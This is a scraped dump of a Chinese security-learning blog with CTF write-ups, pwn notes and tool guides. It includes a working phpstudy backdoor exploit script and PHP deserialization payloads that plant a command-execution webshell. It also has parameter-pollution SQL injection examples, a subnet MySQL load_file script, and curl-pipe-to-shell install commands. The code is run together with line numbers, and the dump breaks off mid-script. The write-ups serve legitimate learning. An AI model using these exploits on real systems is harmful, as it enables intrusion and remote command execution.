转载请标明出处","categories":[],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"BugkuCTF逆向","slug":"BugkuCTF逆向","date":"2019-11-06T14:59:26.000Z","updated":"2019-11-06T07:50:32.124Z","comments":true,"path":"2019/11/06/BugkuCTF逆向/","link":"","permalink":"https://hu5k7.github.io/2019/11/06/BugkuCTF逆向/","excerpt":"","text":"0x00 开言 最近了解了点逆向，pwn，汇编，C，C#等知识，开始试着刷题实战一下。 0x00.1 环境&amp;工具 工具： IDA &amp; OD 环境：Windows7 0x00.2 需要注意的事项 tips: 在windows下逆向需要注意，从windowsXP以上都有开启aslr保护， ​ ASLR（Address space layout randomization）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。 0x01 入门逆向 使用ida打开发现没有任何值得，查看的。直接 按F5查看伪代码 再按R转码 就完事了. 0x02 Easy_vb ida打开 直接往下看。看到flag 0x03 Easy_re 这次使用 od工具 。直接上只能搜索看看。 0x04 游戏过关 这一题比较难。 需要用到的工具: ida &amp; od 0x04.1 第一步 IDA 我们先用 ida 和 od 打开 程序 我们先看ida这边，先看shift+f12看看字符串 发现字符串窗口有个 done!!!the flag is 这里是最后得出flag的地方，我们先不看他，往下翻 这次我们看到 Play a game\\n 这里是程序的 开头言的地方。我们双击跳过去看看。 这里有调用aPlayAGameTheNI函数。我们按x跳到，调用他的地方。 他跳到了最上面的窗口。我们往下翻 看到 input n,n 这里 是让用户输入(1-8)的地方。我们按F5看看伪代码 分析一下伪代码。 我们看到这里是给用户循环输入的地方 有个断点sub_459418();。就是我们要跳转的地方. 我们现在回到之前看到 done!!! the flag is 地方 跳转过去看一看。 看到有一个函数为 aDoneTheFlagIs, 我们打开一个选项，能直接查看到这个的 基址 我们往上翻，找到这个的Top位置 这里。0045E940我们记下来这个基址 再把 sub_459418();这里的基址记下来。 0x04.2 第二步 OD 现在我们回到 od 先这个程序运行起来。点播放键(左上角) 然后我们点Ctrl+G 来跳转地址到0045E940地方。 按F2设置断点。然后到程序里随便输入个数字(1-8),发现该程序运行到了 0045f515地址这里停住了，接下来我们用0045e940这个地址 双击0045f515地址，写上jmp 0045e940(jmp为汇编码，意思跳转) 更新程序运行。点到该程序的循环位置，为止。(0045EB51) 白框的位置便是 ｗｈｉｌｅ循环的地方 我们在0045EBC1地址设置断点 使这个程序直接跳过ｗｈｉｌｅ循环 设置断点后 点继续运行程序 拿到flag! 转载请标明出处","categories":[{"name":"CTF-Reverse-Note","slug":"CTF-Reverse-Note","permalink":"https://hu5k7.github.io/categories/CTF-Reverse-Note/"}],"tags":[{"name":"CTF-Reverse-Note","slug":"CTF-Reverse-Note","permalink":"https://hu5k7.github.io/tags/CTF-Reverse-Note/"}]},{"title":"【Pwn】学习笔记第一期:栈知识","slug":"pwn学习笔记-01","date":"2019-11-01T00:00:00.000Z","updated":"2019-11-06T07:43:42.664Z","comments":true,"path":"2019/11/01/pwn学习笔记-01/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwn学习笔记-01/","excerpt":"","text":"0x00 需要具备的知识 编译程序的内存分配 栈区 (stack) 函数运行时分配，函数结束时释放。由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。其操作方式类似于数据结构中的栈。 堆区 (heap) 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS（操作系统）回收。分配方式类似于链表。 全局区(静态区static) 存放全局变量、静态数据、常量。程序结束后由系统释放。全局区分为已初始化全局区（data）和未初始化全局区（bss）。 常量区(文字常量区) 存放常量字符串，程序结束后有系统释放。 代码区 存放函数体（类成员函数和全局区）的二进制代码。 0x01 堆栈(stack)知识 转载请标明出处","categories":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"【Pwn】学习笔记第零期:开端","slug":"pwn学习笔记-00","date":"2019-11-01T00:00:00.000Z","updated":"2019-11-06T07:43:43.898Z","comments":true,"path":"2019/11/01/pwn学习笔记-00/","link":"","permalink":"https://hu5k7.github.io/2019/11/01/pwn学习笔记-00/","excerpt":"","text":"0x00 起因 有一次已经上了深职院的学长告诉我，深职院那边非常缺pwn选手。我一直挺头疼pwn题的，耗眼力。入门难。 而且这方面的资料也相对较少，所以学习pwn的人也是相对较少的。 不过为了多累计一些知识，硬着头皮尝试的往上顶。冲冲冲！！！ 0x01 需要具备的知识 1.扎实的C基础 2.基本DS：链表、队列、栈 3.基本linux配置与命令 4.会汇编更好，不会的话现学几个常用的也可以救急。 0x02 环境搭建 使用的系统: ubuntu19 工具: python - pwntools ​ pwndbg ​ ida ​ gcc-multilib 转载请标明出处","categories":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/categories/CTF-Pwn-Note/"}],"tags":[{"name":"CTF-Pwn-Note","slug":"CTF-Pwn-Note","permalink":"https://hu5k7.github.io/tags/CTF-Pwn-Note/"}]},{"title":"phpstudy2018_backdoor_exp","slug":"phpstudy2018-backdoor-exp","date":"2019-10-17T13:50:35.000Z","updated":"2019-10-25T08:20:17.953Z","comments":true,"path":"2019/10/17/phpstudy2018-backdoor-exp/","link":"","permalink":"https://hu5k7.github.io/2019/10/17/phpstudy2018-backdoor-exp/","excerpt":"","text":"0x00 起因 前几个星期看到phpstudy带有后门程序。拖到现在才复现,看到可利用便立即写下利用脚本 0x01 exp 12345678910111213141516171819202122# -*-coding:utf-8 -*-import base64import requestsdef Expoit(ip,exp): payload = exp pay = base64.b64encode(payload.encode('utf-8')) headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Connection\": \"close\", \"Accept-Encoding\": \"gzip,deflate\", \"Accept-Charset\": pay, \"Upgrade-Insecure-Requests\": \"1\", &#125; print(headers) url = ip r = requests.get(url,headers=headers)Expoit(input(\"target url&gt;\"),input(\"payload&gt;\")) 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"php反序列化漏洞学习","slug":"PHP反序列化学习","date":"2019-10-05T00:00:00.000Z","updated":"2019-11-06T07:40:39.482Z","comments":true,"path":"2019/10/05/PHP反序列化学习/","link":"","permalink":"https://hu5k7.github.io/2019/10/05/PHP反序列化学习/","excerpt":"","text":"0x00 写在前面 PHP反序列化漏洞虽然利用的条件比较苛刻，但是如果可以利用一般都会产生很严重的后果。在春招的时候很多公司都问过这个问题，说明这个反序列化漏洞的技能点也是很多公司比较关注的技能点。 0x01 PHP反序列化漏洞 PHP反序列化漏洞,一直围绕着两个函数serialize() 和unserialize() 12serialize() //是用于将类转换为一个字符串unserialize() //用于将字符串转换回一个类 serialize() 12345678910&lt;?phpclass fangxuliehua&#123; public $var1=\"test for fangxuliehua\";&#125;$fangxuliehua = new fangxuliehua();//根据fangxuliehua类实列化对象$fangxueliehua_ser = serialize($fangxuliehua);print_r($fangxueliehua_ser);?&gt; 我们这边创建了新的对象，并将他序列化打印出来。结果为： 1O:12:\"fangxuliehua\":1:&#123;s:4:\"var1\";s:4:\"test\";&#125; 这里的O代表的是存储对象(Object),12则是12个字符，也就是存储对象里有12个字符。“fangxuliehua”则是对象的名称，这里的1则代表了**{s:4:“var1”;s:4:“test”;}** 里面有一个值。s表示字符串，4则长度。**“var1”**为字符串名字，后面的相同 unserialize() 与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。 1234567891011121314&lt;?php class fanguxliehua&#123; public $var1=\"test\";&#125;$class= 'O:12:\"fangxuliehua\":1:&#123;s:4:\"var1\";s:4:\"test\";&#125;';print_r($class);echo \"&lt;/br&gt;\";$class_unser=unserialize($class);print_r($class_unser);?&gt; tips:这里使用unserialize()时，会调用__wakeup()成员函数 0x02 反序列化漏洞产生原因 当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 0x03 利用函数构造PAYLOAD Magic function php中有一类特殊的方法叫&quot;魔法函数&quot;(Magic function)， 这里我列出了与 php(反)序列化有关的几个魔法函数: 12345678910__construct() //当一个对象创造时被调用__destruct() //当对象被销毁时触发__wakeup() //使用unserialize()时触发__sleep() //使用serialize()时触发__toString() //把类当作字符串使用时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发 这里我们着重关注一下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct()：当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 代码如下: 123456789101112131415161718192021&lt;?phpclass test&#123; var $var='123'; function __wakeup()&#123; echo \"__wakeup\".\"&lt;br&gt;\"; &#125; function __construct()&#123; echo \"__construct\".\"&lt;br&gt;\"; &#125; function __destruct()&#123; echo \"__destruct\".\"&lt;br&gt;\"; &#125;&#125;echo \"序列化所调用的函数:\".\"&lt;br&gt;\";$data=new test(); //根据test类实列化对象$data=serialize($data);echo \"反序列化所调用的函数:\".\"&lt;br&gt;\";$data1=unserialize($data);print_r($data1);?&gt; 利用示范 _wakeup() 或__destruct() 前面说了利用都是基于“自动调用”的magic function。从而当我们控制序列化字符串时可以去直接触发它们。 这里针对 __wakeup() 场景做个实验。假设index源码如下： 1234567891011121314151617&lt;?phpclass test&#123; var $test = 'test'; function __wakeup()&#123; $fp = fopen(\"webshell.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class_get = $_GET['test'];print_r($class_get);echo \"&lt;/br&gt;\";$class_get_unser = unserialize($class_get);include_once(\"webshell.php\") //包含一下，让它能显示效果 ?&gt; webshell.php需要自己建立。在同目录下建立了一个webshell.php，最先访问index.php 基本思路是，通过serialize()得到我们想要的序列化字符串，之后再传进去。假设我们已知index.php源码。把对象中的$test赋值再调用unserialize()时会通过__wakeup()把$test的写入到shell.php中。 我们写个php脚本: 123456class payload&#123; public $target=\"&lt;?php $a=$_GET[cmd];system($a);?&gt;\";&#125;$a =serialize(new payload);echo $a; 序列化后输出: 1O:7:\"payload\":1:&#123;s:4:\"test\";s:33:\"\";&#125; s:33:&quot;&quot;里面没有payload我们自己写进去: tips:与target=里面的?&gt;&quot;发生了冲突，还未找到解决方案 1O:7:\"payload\":1:&#123;s:4:\"test\";s:33:\"&lt;?php $a=$_GET[cmd];system($a);?&gt;\";&#125; 执行成功！ 其他Magic function的利用 但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？并不是。然而类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。 1234567891011121314151617181920class fangxuliehua_1&#123; function __construct($test)&#123; $fp = fopen(\"webshell.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;class fangxuliehua_2&#123; public $test='test'; function __wakeup()&#123; $obj=new fangxuliehua_1($this-&gt;test); &#125;&#125;$class_get = $_GET['test'];print_r($class_get);echo \"&lt;/br&gt;\";$class_get_unser = unserialize($class_get);include_once(\"webshell.php\");//包含一下，让它能显示效果 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new fangxuliehua_1()会自动调用对象fangxuliehua_1中的__construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 webshell.php中。 1O:14:\"fangxuliehua_2\":1:&#123;s:4:\"test\";s:18:\"&lt;?php%20phpinfo();?&gt;\";&#125; 0x04 利用普通成员方法 前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。 12345678910111213141516171819202122232425262728&lt;?phpclass itishead&#123; public $test; function __construct()&#123; $this-&gt;test= new itisbody(); &#125; function __destruct()&#123; $this-&gt;test-&gt;action(); &#125;&#125;class itisbody&#123; function action()&#123; echo \"hereisbody:)\"; &#125;&#125;class itisfoot&#123; public $test2; function action()&#123; eval($this-&gt;test2); &#125;&#125;$class = new itishead();unserialize($_GET['test']);?&gt; 本意上，new一个新的itishead对象后，调用_construct()，其中又new了itisbody对象。在结束后会调用__destruct()，其中会调用action()，从而输出 itisbody。 利用代码: 123456789101112&lt;?phpclass itishead &#123; var $test; function __construct() &#123; $this-&gt;test = new itisfoot(); &#125;&#125;class itisfoot &#123; var $test2 = \"phpinfo();\";&#125;echo serialize(new itishead());?&gt; 生成： 1O:8:\"itishead\":1:&#123;s:4:\"test\";O:8:\"itisfoot\":1:&#123;s:5:\"test2\";s:10:\"phpinfo();\";&#125;&#125; 把payload传进去: 利用成功！ 参考链接:https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"浅谈经典漏洞HTTP参数污染","slug":"http参数污染","date":"2019-09-24T00:00:00.000Z","updated":"2019-10-25T08:20:11.339Z","comments":true,"path":"2019/09/24/http参数污染/","link":"","permalink":"https://hu5k7.github.io/2019/09/24/http参数污染/","excerpt":"","text":"0x00 问题由来 在先知社区看到一篇文章，从HTTP参数污染达成sql注入。 有点不理解HTTP参数污染是什么，于是就去翻了一些资料和看了视频过来总结一下。 0x01 什么是HTTP常数污染 HTTP参数污染，简单的来说就是给一个参数附上两个或者两个以上的value。对于不同的引擎引用的value会不同。 假设: 如果是jsp+tomcat 返回的请求是第一个value， 如果php+apache 返回的请求是第二个value， 如果是asp+iis 则会返回两个一起的value 0x02 一些例子 1.假设我们有一个网站http://hacker.net/ http://hacker.net/search.php?page=10&amp;page=hacker 当服务器遇到同一个参数赋值不同数值时，会将他们连接起来，hacker可以通过这个方法来绕过黑名单例如 http://hacker.net/search.php?page=select 1&amp;page=2,3,database() 不是在黑名单中的模式，不会触发黑名单的拦截功能，其次，由于web程序会采取连接操作，将前后的内容连接起来，SQL注入行为才能够被执行 0x03 注入和HTTP参数污染有什么关系 如果该网站是采用两个一起的value一起返回，则可以用于Bypass WAF，也可以用于XSS. 最终取决于web服务器 0x04 结尾 经典的漏洞不代表现在没有，可以结合一些payload来达成过WAF。 tips:有点小乱。我看了也有点迷茫了xD 参考链接:https://v.qq.com/x/page/k0870cdqlsb.html 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Hexo插入图片问题的总结","slug":"Hexo插入图片问题的总结","date":"2019-09-18T00:00:00.000Z","updated":"2019-10-25T08:20:08.864Z","comments":true,"path":"2019/09/18/Hexo插入图片问题的总结/","link":"","permalink":"https://hu5k7.github.io/2019/09/18/Hexo插入图片问题的总结/","excerpt":"","text":"0x00 起因: 插入图片的时候hexo-asset-image 插件会在图片的路径前面自动添加/.io/ 0x01 经过了一系列的测试找出了一下几个问题: 问题1 Hexo版本以及插件不是最新 1hexo v 问题2 没有用hexo n &quot;string&quot; 新增文章。 问题3 图片路径的**斜杆**问题 (/)正斜杆和( \\)反斜杆, 如果图片是直接脱进Makedown，它会写路径的是反斜杆 1![]xx\\xx.png 会让hexo-asset-image插件 自动识别成，加一个名字 正常的：BugKuCTF/xx.png 错误的：BugKuCTF/BugKuCTFxx.png 红色 是错的 蓝色 是对的 问题4 如果在旧版本的Hexo安装过，hexo-asset-image 插件 那就需要重装一遍 12npm remove hexo-asset-imagenpm install hexo-asset-image --save 问题5 这个问题我不知道是不是所有人都会。在makedown下，不区分路径大小写，在hexo上传后网页上区分大小写 0x02 最直接最接地气解决问题的办法 就是去修改插件源代码 位置: node_modules\\hexo-asset-image\\index.js tips: 这是我个人博客hexo插入图片时出错的问题,我用的Makedown是Typora，不同的主题有不一样的渲染图片路径的方式，根据不同的方式去修改插件代码。有能力可以自己写插件=w= 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"Python脚本:搜索本地NAS","slug":"本地NAS扫描","date":"2019-06-20T00:00:00.000Z","updated":"2019-10-25T08:19:53.434Z","comments":true,"path":"2019/06/20/本地NAS扫描/","link":"","permalink":"https://hu5k7.github.io/2019/06/20/本地NAS扫描/","excerpt":"","text":"0x00 介绍 每次都会折腾一下实训室的 软路由。不是换linux就是坏掉机子，偶尔还忘记NAS配的固定IP。 所以写下了查找本地NAS脚本。 12345678910111213141516171819202122import socketimport reimport threadingprint(\"\"\"[搜索本地NAS-Version 0.1]\\n默认扫描最后一个网段1.1.1./24\"\"\")host = input(\"本地IP&gt;\")def searchNAS(i): ip = host+str(i) try: Hostname = socket.gethostbyaddr(ip) match = re.search(r'NAS-SERVER',str(Hostname)).group() if match == \"NAS-SERVER\": print(\"NAS服务器IP地址为 &gt; &#123;&#125;:&#123;&#125;\".format(match,ip)) pass except: passfor i in range(0,256): t = threading.Thread(target=searchNAS,args=(i, )) t.start() 局域网内是DHCP会每天会更换IP，所以我打算就做了一个本地NAS的ip搜索器。方便自己找到存储服务器😗 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【BugKuCTF】靶场部分writeup","slug":"BugKuCTF","date":"2019-05-20T00:00:00.000Z","updated":"2019-11-06T07:00:26.461Z","comments":true,"path":"2019/05/20/BugKuCTF/","link":"","permalink":"https://hu5k7.github.io/2019/05/20/BugKuCTF/","excerpt":"","text":"0x00 介绍 开始做一些CTF题目了。打算在高职比赛玩玩CTFxD 地址:https://ctf.bugku.com/challenges WEB篇 [web2] 这种类型直接看源码 F12或者Ctrl+U [计算器]------------------------------------------------------ 试着算出来,然后发现只能输入一位数，就能猜测到他限制了长度，接着我们跑到F12里面去修改即可 [web基础$_GET]------------------------------------------------------ 不解释，直接看代码 [web基础$_POST]------------------------------------------------------ 也不解释，直接看代码，需要用到抓包软件 [矛盾]------------------------------------------------------ 先看代码 问题出现在 is_numeric 这个函数,is_numeric 是判断 传入的字符串是否为数字。如果是则不输出,不是则输出$num。这个时候我们可以绕过这个函数。 他判断的是数字那么我们给他加点字符串 ?num=1a，则绕过了第一个if判断，并跳到了第二个if判断。 然后他现在直接显示出了flag. [web3]--------------------------------------------------- 他会一直弹窗出来。不知道为什么我的Chrome不会跳出来。 接着我们直接看源码F12 或者 Ctrl+U，发现最下面有一个被注释的html编码 我的方法是，编写到文本，换html格式打开。 解码就出来了. [域名解析]------------------------------------------------- 修改hosts访问 flag.baidu.com即可. hosts位置 windows： C:\\Windows\\System32\\drivers\\etc linux: /etc/hosts [你必须让他停下来]-------------------------------------------- 打开网址发现他一直刷新。二话不说直接上Burpsuite抓包，并放到Repeater(Ctrl+R)。 多Go几遍就能看到flag了 [本地文件包含]-------------------------------------------------- 网站进不去。放弃. [变量1]------------------------------------------------------ 先看审计代码，发现最下面有两个$$args $$ 容易引发变量覆盖 思考。我们直接让他全部值显示出来。使用全局变量$GLOBALS 我们直接给他 全局变量$GLOBALS传参进去,args=GLOBALS tips:关于全局变量https://www.runoob.com/php/php-superglobals.html [web5]---------------------------------------------------- 输入字符串,啥东西都没有 直接看看源码F12 或者 Ctrl+U 发现这一串看不懂的编码。这种编码是JSFUCK属于一直 加密方式 tips:原理https://blog.csdn.net/qq_36539075/article/details/79946099 直接F12在Console里粘贴 [头等舱]------------------------------------------------------ 什么也没有。 在看下头等舱。就能猜测到他flag肯定在 请求头那边，于是直接上抓包软件，并GO一遍看看 拿到flag！ [网站被黑]------------------------------------------------------ 打开网站。好炫啊。还会跟着鼠标动，好！偷代码下来了 啥也没提示。直接上御剑扫描找到一个。shell的路径 123.206.87.240:8002/webshell/shell.php 二话不说直接上爆破Burp Suite 输入上去 GET到flag [管理员系统]------------------------------------------------------ 打开发现是一个登入界面。尝试使用SQL万能密码登入 失败了。IP被禁止访问。 于是打开抓包软件在请求头上添加上**X-Forwarded-For 127.0.0.1** 再试试万能密码 密码错误。那么我们来看看源码F12 看到源码中有一个被注释的base64的编码。于是解密出来看是test123那么用户名是**admin密码是test123** tips:不定时更新。每更新十个题目","categories":[{"name":"CTF-Web-Note","slug":"CTF-Web-Note","permalink":"https://hu5k7.github.io/categories/CTF-Web-Note/"}],"tags":[{"name":"CTF-Web-Note","slug":"CTF-Web-Note","permalink":"https://hu5k7.github.io/tags/CTF-Web-Note/"}]},{"title":"Termux安装笔记","slug":"Termux安装","date":"2019-02-02T00:00:00.000Z","updated":"2019-10-25T08:23:28.503Z","comments":true,"path":"2019/02/02/Termux安装/","link":"","permalink":"https://hu5k7.github.io/2019/02/02/Termux安装/","excerpt":"","text":"0x00 介绍 为了方便,随时随地能做渗透测试又安装不了NetHuter的时候做出来的整理。也为了方便我自己以后刷系统能在安装回来，写写笔记 科学上网 在Github上搜索ShadowsocksR (https://github.com/shadowsocksr-backup/shadowsocksr-android/releases) 赛风 Termux下载地址 Google商城(要借助科学上网) 酷安 Termux更改源 自动更换指令 1sed -i 's@^\\(deb.*stable main\\)$@#\\1\\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux stable main@' $PREFIX/etc/apt/sources.list 手动修改 ​ 编辑 $PREFIX/etc/apt/sources.list 修改为如下内容 12# The termux repository mirror from TUNA:deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main 并更新pkg up / apt update 两种方法安装metasploit 两种方法安装metasploit 第一种 1pkg install metasploit 一路默认安装 第二种 1234apt install wgetwget https://Auxilus.github.io/metasploit.shsh metasploit.shpkg install metasploit 1 Termux安装一些Python必要的库 1pkg install python python-dev python2 python2-dev Termux安装一些常用的辅助工具 1pkg install git curl 美化Termux oh-my-zsh的安装 1sh -c \"$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)\" 一步到位，后面自己选择主题和颜色 Termux安装nmap 1pkg install nmap Termux安装SQLMap 12apt install python2 gitgit clone https://github.com/sqlmapproject/sqlmap 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"【转载】黑苹果安装笔记","slug":"BlackApple","date":"2018-12-15T00:00:00.000Z","updated":"2019-10-25T08:21:34.949Z","comments":true,"path":"2018/12/15/BlackApple/","link":"","permalink":"https://hu5k7.github.io/2018/12/15/BlackApple/","excerpt":"","text":"上个星期装的双系统,win10 & MACOS,还把之前的win10搞崩了。害的我只能重装win10 我要总结的转载的简书都。。帮我一起总结了，所以我就懒的写了 嘻嘻 要点: 1、两系统共存则磁盘必须是GPT格式 2、安装mac要用适合机型的EFI文件和相应的安装配置，特别是显卡驱动&lt;br&gt; 3、安装完以后要把mac和win完整的EFI文件合并到一起并且放入电脑安装时自动分好的EFI分区内&lt;br&gt; 4 、用clover挂载好所有的电脑内EFI引导文件（即mac 和 win的） 简略步骤: 远景：从GPT(GUID) 分区开始,EasyUEFI 双系统安装详解(install.wim + mac10.12.5)这是win7+mac10.12的帖子，比较复杂，可以看看，了解EFI分区。win10+mac10.12 直接看12楼的回复就可以了&lt;br&gt; 分区：PE下分一个ESP ，二个NT&lt;br&gt; 安装MAC：u盘安装 安装win10：PE下安装WIN的WIM镜像，在软件里选对系统分区，启动分区，引导类型 EFI引导：装好WIN后，COPY CLOVER进ESP，就完事了 把Mac efi里面CLOVER文件夹放到esp分区的efi文件夹里，然后用easyuefi添加EFI/CLOVER/CLOVERX64.efi引导 在此之前需要的准备： 硬件方面： 一台i7-7700k + Gigabyte Z270X-Gaming5 台式机 最好有一台可用的mac 2个以上空的8G或以上的U盘 软件方面： 准备好mac 10.11.3镜象 准备好在win上制作mac镜象的工具：transmac(自行百度）或者mac上制作mac镜像的工具：Unibeast 准备好在mac上挂载EFI分区的工具：Clover Configurator BIOS设置： 启动方式：UEFI 硬盘模式：ACHI 家伙事准备得差不多了我们就可以开始了。 一、首先制作mac系统安装盘 1 win系统：在win里下载好mac 10.12系统并安装好transmac 2 Mac 系统：下载macOS Sierra 10.12 并安装Unibeast，制作mac安装盘 二、制作win10系统安装盘 三、安装mac，我们要实现mac和win10同时存在，并要双引导，所以必须要uefi引导方式，而win10要uefi引导就必须装在GPT格式的磁盘上，所以，首先，必须将磁盘设置为GPT格式，所以先用win10的系统盘插入电脑，开机，进入安装界面，在选择装在哪个盘的时候点击shift F10，然后在dos里操作，具体操作不再此说明 设置磁盘格式为GPT以后，退出windows安装，我们先还是安装mac 的，把我们做好的mac系统盘插入电脑，开机，按F7，用U盘引导，选择install OS X EI Capitan,按照提示一步一步安装完成即可，大概20-25分钟，取决于你的U盘速度。这里有个分区的问题，你想给mac多少空间，就多少，其它的不用创建分区，等windows创建即可，我128固态给mac40G。之后mac安装完成 四、安装完成后，关机，插入 win7系统盘，同样UEFI安装用U盘引导，安装在ssd剩下的空间里，没有什么好说的。&lt;br&gt;这个时候windows和mac都安装好了，但是这个时候你拨掉U盘开机会发现直接进入了win10系统，说好的选择呢？ 不急，我们mac的efi也还没有替换呢。 五、处理电脑EFI分区：首先，用U盘引导，进入mac,同时用工具挂载电脑和系统盘两个EFI分区，并把EFI文件夹删除，把我们下载好的EFI文件夹分别放进去，不做作何处理，就是说现在电脑里有mac需要的配置、驱动等都有了，关机，拨掉U盘，开机，进入win10系统，在win10下同样挂载电脑EFI分区，怎么挂载呢？， 插入win10的系统盘，把里边的efi文件夹里边的内容替换进去（注意是内容替换，不是把原来的efi删除，把这个放进去，因为原来的efi里边已经有mac的启动文件了） 替换完了后，关机，拨掉win10系统盘，插入mac系统盘，开机，按F7,用U盘引导，在clover界面先择 boot option ,先择第一个挂载所有引导，忘了具体是什么了，大概是这个意思，如果你发现右下角的clover版本号变了，就成功了，这个时候restart，拨掉U盘，开机应该自动到clover选择界面，可以选择作意系统了。此时mac和win10双引导基本完成。 接下来就是安装各种驱动和完善了 参考:https://www.jianshu.com/p/5db38511cc73","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"一周8个精选文章:第一章","slug":"Daily01","date":"2018-12-05T00:00:00.000Z","updated":"2019-11-06T07:40:54.945Z","comments":true,"path":"2018/12/05/Daily01/","link":"","permalink":"https://hu5k7.github.io/2018/12/05/Daily01/","excerpt":"","text":"从外网到内网的渗透姿势分享 : https://xz.aliyun.com/t/5330 基于EVE-NG平台上构建企业内网攻防环境 : https://mp.weixin.qq.com/s/vBYxrmnBoM-Abl_y1v4DtA PHP 函数漏洞总结 : https://blog.csdn.net/qq_31481187/article/details/60968595 CTF Training 经典赛题复现环境: https://github.com/CTFTraining/CTFTraining RemTeam攻击技巧和安全防御 : https://xz.aliyun.com/t/4602(https://evilwing.me/page/2/) 盘点那些渗透测试中的奇淫技巧: https://paper.seebug.org/92/ APT34工具 :https://github.com/p3pperp0tts/APT34 CTF线下攻防指南 : http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/ 转载请标明出处","categories":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/categories/Note/"}],"tags":[{"name":"Note","slug":"Note","permalink":"https://hu5k7.github.io/tags/Note/"}]},{"title":"【Python】:PyMySQL","slug":"Python脚本PyMySQL","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:23:07.665Z","comments":true,"path":"2018/10/10/Python脚本PyMySQL/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本PyMySQL/","excerpt":"","text":"0x00 介绍 突然想起来MYSQL是否也能做成自动GETFALG脚本呢。 这个还有点问题。可以自己修改下:) 1234567891011121314151617181920import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i): ip='192.168.'+str(i)+'101' username='root' password='root' payload = \"SELECT load_file('C:/flag*.txt')\" try: db = pymysql.connect(ip,username,password,\"mysql\") cursor = db.cursor() cursor.execute(payload) data = cursor.fetchall() print(data) except: passfor i in range(1,249): t = threading.Thread(target=mysql, args=(i,)) t.start() 转载请标明出处","categories":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://hu5k7.github.io/tags/Python/"}]},{"title":"【Python】:WebShell","slug":"Python脚本WebShell","date":"2018-10-10T00:00:00.000Z","updated":"2019-10-25T08:22:56.197Z","comments":true,"path":"2018/10/10/Python脚本WebShell/","link":"","permalink":"https://hu5k7.github.io/2018/10/10/Python脚本WebShell/","excerpt":"","text":"1234567891011121314151617import requestsimport 